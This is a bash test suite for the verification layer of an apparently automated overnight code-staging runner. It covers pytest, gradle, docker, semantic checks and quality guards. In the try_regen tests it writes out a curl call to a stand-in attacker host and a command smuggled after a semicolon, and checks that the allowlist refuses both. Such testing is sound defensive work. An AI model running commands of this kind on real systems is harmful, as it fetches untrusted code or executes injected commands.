#!/usr/bin/env bash
# test_ovn_stage_runner_verify.sh — the independent verification layer of the REAL ovn_stage_runner.sh, run end to
# end in a hermetic fake tree (lib_osr_fixture.sh): full_verify (pytest incl. the pytest-xdist guard, gradle, GUT,
# vitest, shell syntax, docker, SEMANTIC wire check, QUALITY guards), try_regen (allowlist + every rejection),
# the verify-repair loop, and the resulting pushed / unverified outcome.
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
. "$HERE/lib_osr_fixture.sh"
trap osr_cleanup EXIT
G(){ grep -qF -- "$1" "$T/out.txt"; }
J(){ osr_jsonl | grep -F -- "$1" >/dev/null; }   # no -q: under pipefail an early-exiting grep SIGPIPEs cat when loaded
V(){ grep -qF -- "$1" <<<"$VL"; }
vl(){ VL="$(osr_vlog)"; }
pushed(){ git -C "$O" log --format=%s overnight/feature | grep -q 'staged step 0'; }
base(){ osr_new; osr_venv backend; osr_plan default "$PLAN_FOO"; osr_aider 1 "$SNIP_FOO"; }
export OVN_STAGE_DEDICATE=0 OVN_VERIFY_REPAIR_ROUNDS=0 OVN_VERIFY_REGEN=0

# -------- pytest: xdist guard --------
echo "== pytest FULL + xdist guard"
base
OVN_XDIST_REPOS=$OSR_REPO osr_run "$OSR_REPO" "$ITEM_PY"; vl
t "allowlisted repo + xdist importable -> parallel '-n 8' passed to pytest" bash -c "grep -q -- '-n 8' '$T/scn/pytest.calls'"
t "verify log says parallel" V "(parallel: -n 8)"
t "verified, pushed" bash -c "pushed || git -C '$O' log --format=%s overnight/feature | grep -q 'staged step'"
osr_cleanup
base
OSR_XDIST_RC=1 OVN_XDIST_REPOS=$OSR_REPO osr_run "$OSR_REPO" "$ITEM_PY"
t "xdist NOT importable in the live venv -> serial (no -n)" bash -c "! grep -q -- '-n ' '$T/scn/pytest.calls' && [ -s '$T/scn/pytest.calls' ]"
osr_cleanup
base
OVN_PYTEST_WORKERS=0 OVN_XDIST_REPOS=$OSR_REPO osr_run "$OSR_REPO" "$ITEM_PY"
t "OVN_PYTEST_WORKERS=0 -> serial" bash -c "! grep -q -- '-n ' '$T/scn/pytest.calls'"
osr_cleanup
base
osr_run "$OSR_REPO" "$ITEM_PY"
t "repo not in the xdist allowlist (default iptv_apps) -> serial" bash -c "! grep -q -- '-n ' '$T/scn/pytest.calls' && [ -s '$T/scn/pytest.calls' ]"
osr_cleanup
# venv at the repo ROOT: `.venv/bin/pytest` -> pkg "repos/<r>" is never stripped to a relative dir so the `-d $wt/$pkg` test fails
osr_new; osr_venv root; osr_plan default "$PLAN_FOO"; osr_aider 1 "$SNIP_FOO"
osr_run "$OSR_REPO" "$ITEM_PY"
kb "root-level .venv: full pytest must still RUN (pkg strip leaves 'repos/<r>' so [ -d \$wt/\$pkg ] is false and the whole python suite is silently skipped)" test -s "$T/scn/pytest.calls"
osr_cleanup

# -------- red verify: unverified outcome --------
echo "== unverified outcome"
base
echo fail > "$T/scn/pytest.mode"
osr_run "$OSR_REPO" "$ITEM_PY"; vl
t "red full suite -> FAILED, NOT pushing" bash -c "grep -q 'independent full-verify: FAILED — NOT pushing' '$T/out.txt'"
t "verify log keeps the pytest output" V "FAILED tests/test_x.py"
t "nothing pushed" bash -c "! git -C '$O' log --format=%s overnight/feature | grep -q 'staged step'"
t "verify journaled false + summary passed 0, item_arg mode -> exit 0" bash -c "[ $RC = 0 ] && cat '$Q'/state/stage_runs/$OSR_REPO-*[0-9].jsonl | grep -q '\"verified\":false' && cat '$Q'/state/stage_runs/$OSR_REPO-*[0-9].jsonl | grep -q '\"passed\":0'"
osr_cleanup

# -------- verify-repair loop --------
echo "== repair loop"
base
echo fail > "$T/scn/pytest.mode"
osr_aider 2 'echo "round one: nothing useful"'
osr_aider 3 'echo ok > "$OSR_SCN/pytest.mode"; echo "# fix" >> backend/app/foo.py; echo "fixed it"'
OVN_VERIFY_REPAIR_ROUNDS=2 osr_run "$OSR_REPO" "$ITEM_PY"
t "round 1/2 fails, round 2/2 repairs -> REPAIR PASSED (round 2)" bash -c "grep -q 'repair round 1/2' '$T/out.txt' && grep -q 'repair round 2/2' '$T/out.txt' && grep -q 'REPAIR PASSED (round 2)' '$T/out.txt'"
t "repair prompt carries THE EXACT FAILURE from the verify log" bash -c "grep -q 'THE EXACT FAILURE' '$T/scn/aider.args.2' && grep -q 'FAILED tests/test_x.py' '$T/scn/aider.args.2'"
t "repair commit + step commits pushed" bash -c "git -C '$O' log --format=%s overnight/feature | grep -q 'repair staged item to pass verification (round 2)' && git -C '$O' log --format=%s overnight/feature | grep -q 'staged step 0'"
t "repair scoped to the changed files via --file" bash -c "grep -A1 -- '--file' '$T/scn/aider.args.2' | grep -q backend/app/foo.py"
osr_cleanup
base
echo fail > "$T/scn/pytest.mode"
OVN_VERIFY_REPAIR_ROUNDS=2 osr_run "$OSR_REPO" "$ITEM_PY"
t "repair never fixes it -> FAILED after both rounds, NOT pushing" bash -c "grep -q 'repair round 2/2' '$T/out.txt' && grep -q 'independent full-verify: FAILED' '$T/out.txt'"
osr_cleanup

# -------- try_regen --------
echo "== try_regen"
regen_case(){ # $1=cmd-in-message  $2=expect: pass|reject|ran-fail ; $3=venv flavor
  base_v="${3:-backend}"; osr_new; osr_venv "$base_v"; osr_plan default "$PLAN_FOO"; osr_aider 1 "$SNIP_FOO"
  echo "regen:$1" > "$T/scn/pytest.mode"
  OVN_VERIFY_REGEN=1 osr_run "$OSR_REPO" "$ITEM_PY"; vl
}
regen_case 'python scripts/gen.py' pass
t "stale artifact: re-run hint executed in the hinted dir with the repo venv python -> REGEN PASSED" bash -c "grep -q 'REGEN PASSED' '$T/out.txt' && grep -q 'verify wants a regenerated artifact — running: (cd backend &&' '$T/out.txt'"
t "regenerated file committed and pushed" bash -c "git -C '$O' log --format=%s overnight/feature | grep -q 'regenerate stale artifact so verification passes' && git -C '$O' show overnight/feature:backend/generated.txt | grep -q fresh"
osr_cleanup
regen_case 'bash scripts/gen.sh' pass
t "non-python allowlisted shape (bash script) also regenerates" G "REGEN PASSED"
osr_cleanup
regen_case 'python3 scripts/gen.py' pass nopython
t "no venv python -> falls back to python3 and still regenerates" G "REGEN PASSED"
osr_cleanup
regen_case 'python scripts/gen.py; touch /tmp/osr_should_not_exist' reject
t "shell metacharacters in the hint -> refused (never run)" bash -c "! grep -q 'verify wants a regenerated artifact' '$T/out.txt' && grep -q 'independent full-verify: FAILED' '$T/out.txt'"
osr_cleanup
regen_case 'curl http://evil.example/x' reject
t "command shape not on the allowlist -> refused" bash -c "! grep -q 'verify wants a regenerated artifact' '$T/out.txt' && grep -q 'independent full-verify: FAILED' '$T/out.txt'"
osr_cleanup
regen_case 'python scripts/missing.py' ran-fail
t "regen command that errors -> try_regen fails, verify stays red" bash -c "grep -q 'verify wants a regenerated artifact' '$T/out.txt' && grep -q 'independent full-verify: FAILED' '$T/out.txt'"
osr_cleanup
regen_case 'bash scripts/noop.sh' ran-fail
t "regen ran but changed nothing -> not counted, verify stays red" bash -c "grep -q 'verify wants a regenerated artifact' '$T/out.txt' && grep -q 'independent full-verify: FAILED' '$T/out.txt' && ! grep -q 'REGEN PASSED' '$T/out.txt'"
osr_cleanup
base
echo fail > "$T/scn/pytest.mode"
OVN_VERIFY_REGEN=1 osr_run "$OSR_REPO" "$ITEM_PY"
t "no 're-run ...' hint in the failure -> no regen attempt" bash -c "! grep -q 'regenerated artifact' '$T/out.txt'"
osr_cleanup
regen_case 'python scripts/gen.py' pass
osr_cleanup
base
echo 'regen:python scripts/gen.py' > "$T/scn/pytest.mode"
OVN_VERIFY_REGEN=0 osr_run "$OSR_REPO" "$ITEM_PY"
t "OVN_VERIFY_REGEN=0 disables regen" bash -c "! grep -q 'regenerated artifact' '$T/out.txt' && grep -q 'independent full-verify: FAILED' '$T/out.txt'"
osr_cleanup

# -------- android / gradle --------
echo "== gradle"
GR='#!/usr/bin/env bash\necho "gradle $* @ $PWD" >> "$OSR_SCN/gradle.calls"; exit "$(cat "$OSR_SCN/gradle.rc" 2>/dev/null || echo 0)"\n'
base
osr_tracked android/gradlew "$GR" 755; osr_tracked android/settings.gradle.kts 'rootProject.name="a"\n'
osr_tracked other/gradlew "$GR" 755                      # gradlew with no settings file -> ignored
osr_tracked android2/gradlew "$GR" 755; osr_tracked android2/settings.gradle 'rootProject.name="b"\n'
git -C "$RD" add -f /dev/null 2>/dev/null; printf 'sdk.dir=/x\n' > "$RD/android2/local.properties"; git -C "$RD" add -f android2/local.properties; git -C "$RD" commit -q -m lp; git -C "$RD" push -q origin HEAD:overnight/feature
osr_run "$OSR_REPO" "$ITEM_PY"; vl
t "gradle test runs in each dir that has a settings file, not in the one without" bash -c "grep -c 'gradle test --console=plain' '$T/scn/gradle.calls' | grep -qx 2"
t "verify log marks android + android2 only" bash -c "grep -q 'gradlew test FULL in android' <<<\"\$(cat '$Q'/state/stage_runs/*.verify.log)\" && ! grep -q 'FULL in other' '$Q'/state/stage_runs/*.verify.log"
t "green gradle -> verified" G "independent full-verify: PASSED"
osr_cleanup
base
osr_tracked android/gradlew "$GR" 755; osr_tracked android/settings.gradle.kts 'rootProject.name="a"\n'
echo 1 > "$T/scn/gradle.rc"
osr_run "$OSR_REPO" "$ITEM_PY"
t "red gradle -> unverified" G "independent full-verify: FAILED"
osr_cleanup

# -------- godot / GUT --------
echo "== godot GUT"
for mode in ok fail noasserts empty parse; do
  base; osr_godot "$mode"
  osr_run "$OSR_REPO" "$ITEM_PY"
  case "$mode" in
    ok) t "GUT ok -> verified" G "independent full-verify: PASSED";;
    *)  t "GUT '$mode' -> unverified" G "independent full-verify: FAILED";;
  esac
  osr_cleanup
done
base; osr_tracked project.godot 'x\n'       # project.godot but no godot4 binary -> GUT step skipped entirely
osr_run "$OSR_REPO" "$ITEM_PY"
t "project.godot without godot4 binary -> GUT skipped, still verified" G "independent full-verify: PASSED"
osr_cleanup

# -------- vitest / node_modules --------
echo "== vitest"
base
osr_tracked web/package.json '{"devDependencies":{"vitest":"1.0.0"}}\n'
mkdir -p "$RD/web/node_modules/.bin"; echo x > "$RD/web/node_modules/marker"
export OVN_STAGE_VITEST_FULL=1   # 2026-09-30: the (fixed) full-vitest verify is opt-in
osr_run "$OSR_REPO" "$ITEM_PY"; vl
t "per-step gate sees the main clone's node_modules symlinked into the worktree from the start" bash -c "grep -q 'link=y' '$T/scn/autotest.calls'"
t "full vitest run is invoked when OVN_STAGE_VITEST_FULL=1 (package.json containing vitest is found)" bash -c "grep -q 'npx vitest run' '$T/scn/npx.calls'"
t "verify log marks vitest FULL" V "-- vitest FULL --"
osr_cleanup
base
osr_tracked web/package.json '{"devDependencies":{"vitest":"1.0.0"}}\n'
mkdir -p "$RD/web/node_modules"; echo 1 > "$T/scn/npx.rc"
osr_run "$OSR_REPO" "$ITEM_PY"
t "red vitest makes the combined result unverified" G "independent full-verify: FAILED"
unset OVN_STAGE_VITEST_FULL
osr_cleanup
base
osr_tracked web/package.json '{"devDependencies":{"vitest":"1.0.0"}}\n'
mkdir -p "$RD/web/node_modules"; : > "$T/scn/npx.calls" 2>/dev/null || true
osr_run "$OSR_REPO" "$ITEM_PY"; vl
t "full vitest verify is OFF by default (opt-in via OVN_STAGE_VITEST_FULL=1): no vitest FULL line" bash -c "! grep -q 'vitest FULL' <<<\"$VL\""
osr_cleanup
base
osr_tracked web/package.json '{"name":"x"}\n'
mkdir -p "$RD/web/node_modules"
osr_run "$OSR_REPO" "$ITEM_PY"
t "package.json without vitest -> no vitest run" bash -c "[ ! -f '$T/scn/npx.calls' ]"
osr_cleanup

# -------- shell syntax --------
echo "== shell syntax"
base
osr_tracked backend/scripts/bad.sh 'if then\n'
osr_run "$OSR_REPO" "$ITEM_PY"; vl
t "bash -n failure on a tracked .sh -> unverified" bash -c "grep -q 'independent full-verify: FAILED' '$T/out.txt'"
osr_cleanup

# -------- docker --------
echo "== docker"
base
osr_tracked backend/Dockerfile 'FROM scratch\n'; osr_tracked ops/Dockerfile 'FROM scratch\n'
osr_aider 1 "$SNIP_FOO
mkdir -p infra; echo 'FROM scratch' > infra/Dockerfile
echo 'FROM scratch
RUN true' > backend/Dockerfile"
osr_run "$OSR_REPO" "$ITEM_PY"; vl
t "only the NEW and the CHANGED Dockerfile are built (unchanged one skipped)" bash -c "grep -c '^docker build' '$T/scn/docker.calls' | grep -qx 2"
t "each built image is docker rmi'd afterwards" bash -c "grep -c '^docker rmi' '$T/scn/docker.calls' | grep -qx 2"
t "verify log names the docker builds" bash -c "cat '$Q'/state/stage_runs/*.verify.log | grep -q 'docker build FULL in infra'"
t "green docker -> verified" G "independent full-verify: PASSED"
osr_cleanup
base
osr_aider 1 "$SNIP_FOO
mkdir -p infra; echo 'FROM scratch' > infra/Dockerfile"
echo 1 > "$T/scn/docker.rc"
osr_run "$OSR_REPO" "$ITEM_PY"
t "failed docker build -> unverified (image still removed)" bash -c "grep -q 'independent full-verify: FAILED' '$T/out.txt' && grep -q '^docker rmi' '$T/scn/docker.calls'"
osr_cleanup

# -------- SEMANTIC wire check --------
echo "== semantic wire check"
SEM_FAIL='[T3] backend/app/svc.py — Wire `helper_x` into svc.run_job. VERIFY: `pytest backend/tests` (cat:python)'
base
osr_plan default '[{"desc":"define helper_x","files":["backend/app/svc.py"],"verify":"t"}]'
osr_aider 1 'printf "def helper_x():\n    return 2\n\ndef run_job():\n    return 1\n" > backend/app/svc.py'
osr_run "$OSR_REPO" "$SEM_FAIL"; vl
t "symbol only defined, never used -> SEMANTIC FAIL, unverified" bash -c "grep -q 'independent full-verify: FAILED' '$T/out.txt'"
t "verify log says the integration never happened" V "SEMANTIC FAIL: backend/app/svc.py only defines (or never uses) helper_x"
osr_cleanup

SEM_ALT='[T3] backend/app/svc.py — Wire: in `add_x` the error path now calls `handle_y(db)`. VERIFY: `pytest backend/tests` (cat:python)'
base
osr_plan default '[{"desc":"use handle_y in add_x","files":["backend/app/svc.py"],"verify":"t"}]'
osr_aider 1 'printf "def handle_y(db):\n    return db\n\ndef add_x(db):\n    return handle_y(db)\n" > backend/app/svc.py'
osr_run "$OSR_REPO" "$SEM_ALT"; vl
t "first backtick token is the EDITED function; the called symbol is found via the call-syntax fallback" V "semantic OK: backend/app/svc.py uses handle_y"
t "...and the item verifies" G "independent full-verify: PASSED"
osr_cleanup

SEM_ONE='[T3] backend/app/svc.py — Wire `ext_fn` into svc.run_job. VERIFY: `pytest backend/tests` (cat:python)'
base
osr_plan default '[{"desc":"call ext_fn","files":["backend/app/svc.py"],"verify":"t"}]'
osr_aider 1 'printf "def run_job():\n    return ext_fn()\n" > backend/app/svc.py'
osr_run "$OSR_REPO" "$SEM_ONE"; vl
t "one reference and no local definition (imported elsewhere) counts as used" V "semantic OK: backend/app/svc.py uses ext_fn (1 refs)"
osr_cleanup

SEM_NOFILE='[T3] backend/app/nothere.py — Wire `ext_fn` into nothere.run. VERIFY: `pytest backend/tests` (cat:python)'
base
osr_run "$OSR_REPO" "$SEM_NOFILE"; vl
t "target file missing in the worktree -> semantic check skipped (neither OK nor FAIL)" bash -c "! grep -q 'semantic OK\|SEMANTIC FAIL' <<<\"\$VL\""
osr_cleanup

# -------- QUALITY guards --------
echo "== quality guards"
base
osr_plan default '[{"desc":"many things","files":["backend/app/stubby.py"],"verify":"t"}]'
osr_aider 1 'printf "def stubby():\n    raise NotImplementedError\n" > backend/app/stubby.py
printf "def nop():\n    pass\n" > backend/app/nop.py
: > backend/app/empty.py
printf "def test_zz():\n    assert True\n" > backend/tests/test_zz.py
mkdir -p game; printf "static func gg() -> void:\n\tpass\n" > game/g.gd'
osr_run "$OSR_REPO" "$ITEM_PY"; vl
t "stub keyword on an added line -> QUALITY FAIL stub/placeholder" V "QUALITY FAIL: backend/app/stubby.py is a stub/placeholder"
t "added function with bare pass body (.py) -> QUALITY FAIL" V "QUALITY FAIL: backend/app/nop.py has a bare pass/no-op body"
t "added function with bare pass body (.gd) -> QUALITY FAIL" V "QUALITY FAIL: game/g.gd has a bare pass/no-op body"
t "0-byte changed file -> QUALITY FAIL" V "QUALITY FAIL: backend/app/empty.py is a 0-byte file"
t "changed test that exercises nothing -> QUALITY FAIL" V "QUALITY FAIL: no changed test exercises the changed source"
t "=> unverified" G "independent full-verify: FAILED"
osr_cleanup

base
osr_plan default '[{"desc":"route","files":["backend/app/routes.py"],"verify":"t"}]'
osr_aider 1 'printf "from fastapi import APIRouter\nrouter = APIRouter()\n\n@router.get(\"/topics\")\ndef list_items():\n    return []\n" > backend/app/routes.py
printf "def test_topics(client):\n    assert client.get(\"/topics\").status_code == 200\n" > backend/tests/test_api.py'
osr_run "$OSR_REPO" "$ITEM_PY"; vl
t "endpoint test that only hits the added route path counts as exercising it" bash -c "grep -q 'independent full-verify: PASSED' '$T/out.txt' && ! grep -q 'QUALITY FAIL' <<<\"\$VL\""
osr_cleanup

base
osr_plan default '[{"desc":"module","files":["backend/app/zmod.py"],"verify":"t"}]'
osr_aider 1 'printf "def qq():\n    return 1\n" > backend/app/zmod.py
printf "import zmod\n\ndef test_it():\n    assert zmod\n" > backend/tests/test_zmod.py'
osr_run "$OSR_REPO" "$ITEM_PY"; vl
t "test referencing only the changed MODULE name counts" bash -c "grep -q 'independent full-verify: PASSED' '$T/out.txt'"
osr_cleanup

# pre-existing "placeholder" text must not trip the scoped stub check; only ADDED lines are judged
base
osr_tracked backend/app/old.py '# a placeholder note that was always here\ndef old():\n    return 0\n'
osr_plan default '[{"desc":"extend old","files":["backend/app/old.py"],"verify":"t"}]'
osr_aider 1 'printf "\ndef newer():\n    return 2\n" >> backend/app/old.py'
osr_run "$OSR_REPO" "$ITEM_PY"; vl
t "pre-existing placeholder text in an untouched part of the file is not a QUALITY FAIL" bash -c "grep -q 'independent full-verify: PASSED' '$T/out.txt'"
osr_cleanup

osr_summary
